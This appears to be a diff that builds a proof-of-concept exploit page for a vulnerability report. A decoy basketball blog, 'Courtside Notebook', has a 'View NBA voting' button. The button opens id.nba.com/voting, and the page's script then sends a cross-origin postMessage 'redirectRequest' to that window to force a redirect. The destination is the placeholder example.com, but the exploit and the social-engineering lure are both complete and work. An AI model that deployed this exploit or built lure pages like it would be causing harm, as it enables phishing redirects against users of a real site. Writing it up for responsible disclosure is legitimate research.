@@ -1,29 +1,295 @@
 <!doctype html>
-<html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Courtside Notebook — Five NBA Storylines to Watch</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Georgia, "Times New Roman", serif;
+      background: #f5f5f3;
+      color: #202020;
+      line-height: 1.65;
+    }
+
+    header {
+      background: white;
+      border-bottom: 1px solid #ddd;
+      padding: 20px;
+    }
+
+    .header-inner {
+      max-width: 900px;
+      margin: auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .brand {
+      font-family: Arial, sans-serif;
+      font-weight: 800;
+      font-size: 24px;
+      letter-spacing: -0.5px;
+    }
+
+    .tagline {
+      font-family: Arial, sans-serif;
+      color: #777;
+      font-size: 13px;
+    }
+
+    main {
+      max-width: 760px;
+      margin: 45px auto;
+      background: white;
+      padding: 55px 65px;
+      box-shadow: 0 3px 18px rgba(0,0,0,.06);
+    }
+
+    .category {
+      font-family: Arial, sans-serif;
+      text-transform: uppercase;
+      font-size: 12px;
+      font-weight: bold;
+      letter-spacing: 1.5px;
+      color: #777;
+    }
+
+    h1 {
+      font-size: 42px;
+      line-height: 1.12;
+      margin: 10px 0 18px;
+    }
+
+    .subtitle {
+      color: #555;
+      font-size: 20px;
+      line-height: 1.45;
+    }
+
+    .byline {
+      font-family: Arial, sans-serif;
+      font-size: 13px;
+      color: #777;
+      border-bottom: 1px solid #eee;
+      padding-bottom: 25px;
+      margin-bottom: 30px;
+    }
+
+    p {
+      font-size: 18px;
+    }
+
+    h2 {
+      font-size: 27px;
+      margin-top: 38px;
+    }
+
+    .callout {
+      margin: 40px 0;
+      padding: 25px;
+      background: #f3f6f9;
+      border-left: 4px solid #333;
+      font-family: Arial, sans-serif;
+    }
+
+    .callout strong {
+      display: block;
+      font-size: 19px;
+      margin-bottom: 8px;
+    }
+
+    button {
+      appearance: none;
+      border: 0;
+      border-radius: 5px;
+      background: #1d428a;
+      color: white;
+      padding: 14px 22px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      opacity: .92;
+    }
+
+    #status {
+      margin-top: 10px;
+      font-family: Arial, sans-serif;
+      font-size: 12px;
+      color: #888;
+    }
+
+    footer {
+      text-align: center;
+      color: #999;
+      font-family: Arial, sans-serif;
+      font-size: 12px;
+      padding: 25px;
+    }
+  </style>
+</head>
+
 <body>
-  <iframe
-    id="nba"
-    src="https://id.nba.com/voting"
-    width="900"
-    height="600">
-  </iframe>
 
-  <br>
+<header>
+  <div class="header-inner">
+    <div>
+      <div class="brand">Courtside Notebook</div>
+      <div class="tagline">Basketball news, analysis & fan culture</div>
+    </div>
+    <div class="tagline">September 25, 2026</div>
+  </div>
+</header>
 
-  <button id="test">Send benign redirectRequest</button>
+<main>
 
-  <script>
-    document.querySelector("#test").onclick = () => {
-      const frame = document.querySelector("#nba");
+  <div class="category">NBA • Fan Culture</div>
 
-      frame.contentWindow.postMessage(
-        {
-          identifier: "redirectRequest",
-          url: "https://example.com/"
-        },
-        "https://id.nba.com"
-      );
-    };
-  </script>
+  <h1>Five NBA Storylines Fans Should Be Watching Right Now</h1>
+
+  <div class="subtitle">
+    From young stars taking another step to the way fans are getting
+    involved off the court, there is plenty to follow heading into the
+    next stretch of the NBA calendar.
+  </div>
+
+  <div class="byline">
+    By Alex Carter • 6 minute read
+  </div>
+
+  <p>
+    The NBA never really has an offseason anymore. Between player movement,
+    international basketball, new media deals and an increasingly active
+    online fan community, there is almost always something happening.
+  </p>
+
+  <h2>1. Fans have more ways to participate</h2>
+
+  <p>
+    NBA ID has steadily become a bigger part of how fans participate in
+    league activities. Voting, rewards and other interactive experiences
+    increasingly live alongside the normal game and team experience.
+  </p>
+
+  <div class="callout">
+    <strong>NBA fan voting</strong>
+    NBA currently hosts voting experiences through the official NBA ID site.
+
+    <p>
+      <button id="open">
+        View NBA voting
+      </button>
+    </p>
+
+    <div id="status"></div>
+  </div>
+
+  <h2>2. Young players are reshaping the league</h2>
+
+  <p>
+    Every season introduces another group of players capable of changing
+    how teams build their rosters. Athleticism continues to increase while
+    skill development is happening earlier than ever.
+  </p>
+
+  <h2>3. The international game keeps growing</h2>
+
+  <p>
+    Basketball has become increasingly global, and that is reflected across
+    the league. International stars are no longer unusual—they are central
+    to the championship picture.
+  </p>
+
+  <h2>4. Technology is becoming part of the fan experience</h2>
+
+  <p>
+    Personalized accounts, streaming, voting and interactive experiences are
+    becoming increasingly connected. Fans often move between several NBA
+    properties without thinking much about the technology underneath them.
+  </p>
+
+  <h2>5. The season never really stops</h2>
+
+  <p>
+    Free agency, trades, international competition and year-round basketball
+    discussion mean there is almost always another storyline around the
+    corner.
+  </p>
+
+</main>
+
+<footer>
+  Courtside Notebook • Independent basketball commentary
+</footer>
+
+
+<script>
+let nba = null;
+
+const status = document.querySelector("#status");
+
+function log(message) {
+  status.textContent = message;
+  console.log(message);
+}
+
+document.querySelector("#open").onclick = () => {
+
+  nba = window.open(
+    "https://id.nba.com/voting",
+    "nba_vote_window"
+  );
+
+  if (!nba) {
+    log("Popup was blocked by the browser.");
+    return;
+  }
+
+  log("Opening official NBA voting…");
+
+  /*
+   * Security-research demonstration:
+   *
+   * The victim performs only the initial click above.
+   *
+   * After the legitimate NBA window has had time to load,
+   * the unrelated opener sends the confirmed redirectRequest.
+   *
+   * example.com is intentionally used as a benign destination.
+   */
+
+  setTimeout(() => {
+
+    if (!nba || nba.closed) {
+      console.log("NBA window is no longer available.");
+      return;
+    }
+
+    console.log(
+      "PoC: sending cross-origin redirectRequest to NBA ID"
+    );
+
+    nba.postMessage(
+      {
+        identifier: "redirectRequest",
+        url: "https://example.com/"
+      },
+      "https://id.nba.com"
+    );
+
+  }, 15000);
+};
+</script>
+
 </body>
 </html>
